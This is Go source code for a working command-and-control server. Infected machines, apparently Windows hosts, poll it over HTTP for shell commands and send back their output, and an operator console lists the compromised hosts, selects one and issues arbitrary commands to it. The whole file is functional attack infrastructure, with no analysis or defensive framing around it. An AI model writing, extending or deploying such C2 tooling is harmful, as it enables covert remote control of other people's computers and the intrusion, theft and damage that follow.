package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

type shell struct {
	id        string
	ip        string
	version   string
	command   string
	timestamp time.Time
}

var shells = make(map[string]*shell)
var currentShell *shell
var mutex = &sync.Mutex{}

func getCommandHandler(w http.ResponseWriter, r *http.Request) {
	id := r.URL.Query().Get("id")

	mutex.Lock()
	defer mutex.Unlock()

	if _, ok := shells[id]; !ok {
		shells[id] = &shell{
			id:      id,
			ip:      r.RemoteAddr,
			version: "Unknown",
		}
	}
	shells[id].timestamp = time.Now()

	if currentShell != nil && currentShell.id == id {
		fmt.Fprint(w, currentShell.command)
		currentShell.command = ""
	} else {
		fmt.Fprint(w, "")
	}
}

func postResultHandler(w http.ResponseWriter, r *http.Request) {
	id := r.URL.Query().Get("id")
	body, _ := ioutil.ReadAll(r.Body)
	r.Body.Close()

	mutex.Lock()
	defer mutex.Unlock()

	if s, ok := shells[id]; ok {
		if strings.Contains(string(body), "Microsoft Windows") {
			s.version = strings.TrimSpace(string(body))
		} else {
			if currentShell != nil && currentShell.id == id {
				fmt.Printf("Command output from shell %s:\n%s\n", id, string(body))
			}
		}
		s.timestamp = time.Now()
	} else {
		shells[id] = &shell{
			id:        id,
			ip:        strings.Split(r.RemoteAddr, ":")[0],
			version:   strings.TrimSpace(string(body)),
			command:   "",
			timestamp: time.Now(),
		}
	}
}

func readUserCommand() {
	reader := bufio.NewReader(os.Stdin)

	for {
		if currentShell != nil {
			fmt.Printf("xShell %s> ", currentShell.id)
		} else {
			fmt.Print("C2> ")
		}

		command, _ := reader.ReadString('\n')
		command = strings.TrimSuffix(command, "\n")

		if command == "shells" {
			mutex.Lock()
			for id, shell := range shells {
				fmt.Printf("ID: %s, IP: %s, Version: %s\n", id, shell.ip, shell.version)
			}
			mutex.Unlock()
		} else if strings.HasPrefix(command, "shell ") {
			id := strings.TrimPrefix(command, "shell ")
			mutex.Lock()
			if shell, ok := shells[id]; ok {
				currentShell = shell
			} else {
				fmt.Printf("No shell with ID %s\n", id)
			}
			mutex.Unlock()
		} else if command == "exit" {
			currentShell = nil
		} else if command == "quit" && currentShell != nil {
			mutex.Lock()
			delete(shells, currentShell.id)
			mutex.Unlock()
			currentShell = nil
		} else if currentShell != nil {
			currentShell.command = command
		} else {
			fmt.Println("Unknown command")
		}
	}
}

func cleanOldShells() {
	for {
		mutex.Lock()
		for id, shell := range shells {
			if time.Since(shell.timestamp) > 5*time.Minute {
				delete(shells, id)
			}
		}
		mutex.Unlock()
		time.Sleep(1 * time.Minute)
	}
}

func main() {
	http.HandleFunc("/command", getCommandHandler)
	http.HandleFunc("/result", postResultHandler)

	go func() {
		http.ListenAndServe(":80", nil)
	}()

	go cleanOldShells()
	readUserCommand()
}
